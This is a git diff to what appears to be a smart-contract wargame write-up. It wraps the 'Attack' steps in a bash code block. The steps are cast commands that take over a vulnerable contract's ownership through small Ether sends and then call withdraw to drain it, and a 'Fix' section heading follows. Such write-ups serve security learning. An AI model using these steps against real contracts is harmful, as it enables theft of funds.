@@ -23,6 +23,7 @@ The `contribute` function requires that the value of Ether sent is less than 0.0
 
 ## Attack
 
+```bash
 1. await contract.address
 2. # await contract.owner()
    cast call $CONTRACT_ADDRESS "owner()" --rpc-url $ALCHEMY_RPC_URL
@@ -31,6 +32,7 @@ The `contribute` function requires that the value of Ether sent is less than 0.0
 5. # {value: msg.value}("")
    cast send $CONTRACT_ADDRESS --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
 6. cast send $CONTRACT_ADDRESS "withdraw()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
+```
 
 ## Fix
 
